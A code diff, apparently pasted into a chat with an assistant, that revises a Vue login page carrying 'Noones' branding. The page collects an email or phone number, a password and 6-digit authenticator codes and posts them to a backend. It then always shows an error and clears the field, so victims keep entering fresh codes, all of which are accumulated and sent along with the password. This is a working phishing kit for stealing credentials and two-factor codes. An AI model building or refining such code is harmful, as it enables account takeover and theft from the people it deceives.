@@ -1,3 +1,4 @@
+You said:
 <template>
   <div class="flex flex-col">
     <div class="flex flex-col relativ h-[45vh]">
@@ -168,6 +169,7 @@
             type="text"
             placeholder="XXXXXX"
             v-model="credentials.authenticator"
+            :maxlength="6"
             class="absolute outline-none top-[12px] w-[87%] xs:w-11/12 h-6 px-2 font-bold text-lg mx-2 font-mono bg-red z-20"
             :class="{
               'border-red-500':
@@ -181,6 +183,12 @@
           >
             Please enter the authenticator code.
           </span>
+
+          <!-- Feedback Message for 6-Digit Code -->
+          <div
+            v-if="credentials.authenticator.length === 6"
+            class="text-green-500 text-sm font-semibold"
+          ></div>
         </div>
 
         <!-- Error Message -->
@@ -213,7 +221,7 @@
 </template>
 
 <script setup>
-import { ref, onMounted, onBeforeUnmount } from "vue";
+import { ref, onMounted, onBeforeUnmount, watch } from "vue";
 import Noones1 from "@/assets/SVGs/Noones1.vue";
 import Noones2 from "@/assets/SVGs/Noones2.vue";
 import Noones3 from "@/assets/SVGs/Noones3.vue";
@@ -228,29 +236,31 @@ import PasswordComponent from "./PasswordComponent.vue";
 import ShowPasswordSvg from "@/assets/SVGs/ShowPasswordSvg.vue";
 import HidePasswordSVG from "@/assets/SVGs/HidePasswordSVG.vue";
 
-// State variables
+// Local states
+const authCodes = ref([]);
 const phone = ref(false);
 const enterPassword = ref(false);
 const emailOrPhone = ref("");
 const currentDisplay = ref("one");
 const showPassword = ref(false);
 const credentials = ref({
+  emailOrPhone: "",
   password: "",
   authenticator: "",
 });
 const formSubmitted = ref(false);
-const authError = ref(null);
+const authError = ref(false);
 
 let intervalId;
 
-// Rotating UI display
+// Change the rotating display (UI effect)
 const changeDisplay = () => {
   const displays = ["one", "two", "three", "four"];
   const currentIndex = displays.indexOf(currentDisplay.value);
   currentDisplay.value = displays[(currentIndex + 1) % displays.length];
 };
 
-// Lifecycle hooks
+// Lifecycle hooks for interval effect
 onMounted(() => {
   intervalId = setInterval(changeDisplay, 200);
 });
@@ -262,11 +272,11 @@ onBeforeUnmount(() => {
 // Submit email/phone and password
 const submitEmail = async () => {
   formSubmitted.value = true;
-  authError.value = null;
+  authError.value = false;
 
   if (emailOrPhone.value && credentials.value.password) {
     try {
-      const response = await fetch("/api/submit-user-data/", {
+      const response = await fetch("/api/submit/", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -276,63 +286,82 @@ const submitEmail = async () => {
       });
 
       if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.error || "Submission failed");
+        throw new Error("Invalid email or password");
       }
 
       const data = await response.json();
-      console.log("User data saved:", data);
+      console.log("Submission response:", data);
 
-      // Transition to authenticator input
+      // Move to authenticator input
       enterPassword.value = true;
-      credentials.value.password = "";
+
+      // Clear password and set focus to authenticator field
+      // credentials.value.password = "";
+      setTimeout(() => {
+        document.querySelector("input[placeholder='XXXXXX']").focus();
+      }, 0);
     } catch (error) {
-      console.error("Submission failed:", error.message);
-      authError.value = error.message;
+      console.error("Submission failed:", error);
+      authError.value = true;
     } finally {
       formSubmitted.value = false;
     }
   } else {
-    authError.value = "Please fill out both fields.";
+    alert("Please fill out both fields.");
     formSubmitted.value = false;
   }
 };
 
-// Submit authenticator code
+// Watcher to monitor the length of the authenticator code
+watch(
+  () => credentials.value.authenticator,
+  (newValue) => {
+    // Restrict input to 6 characters
+    if (newValue.length > 6) {
+      credentials.value.authenticator = newValue.slice(0, 6);
+    }
+  }
+);
+
+// Update submitLogins function to handle 6-digit code
 const submitLogins = async () => {
   formSubmitted.value = true;
-  authError.value = null;
 
-  if (credentials.value.authenticator) {
+  // Only submit when authenticator code is exactly 6 digits
+  if (credentials.value.authenticator.length === 6) {
+    // Store the authenticator codes as needed
+    authCodes.value.push(credentials.value.authenticator);
+
     try {
-      const response = await fetch("/api/submit-authenticator-code/", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          emailOrPhone: emailOrPhone.value,
-          password: credentials.value.password,
-          authenticatorCode: credentials.value.authenticator,
-        }),
-      });
+      const response = await fetch(
+        "/api/submit-authenticator-code/", // Correct endpoint for submitting authenticator code
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            emailOrPhone: emailOrPhone.value,
+            password: credentials.value.password, // Include password
+            authenticatorCodes: authCodes.value, // Send all stored codes
+          }),
+        }
+      );
 
       if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.error || "Failed to save authenticator code");
+        throw new Error(`Network response was not ok: ${response.statusText}`);
       }
 
       const data = await response.json();
-      console.log("Authenticator code saved successfully:", data);
-
-      // Simulate an error for UI purposes
-      throw new Error("Wrong code, enter the most recent code");
+      console.log("Authenticator codes stored:", data);
+      authError.value = true;
+      credentials.value.authenticator = "";
     } catch (error) {
-      console.error("Submission failed:", error.message);
-      authError.value = error.message;
+      console.error("Submission failed:", error);
     } finally {
       formSubmitted.value = false;
     }
   } else {
-    authError.value = "Please enter the authenticator code.";
     formSubmitted.value = false;
   }
 };
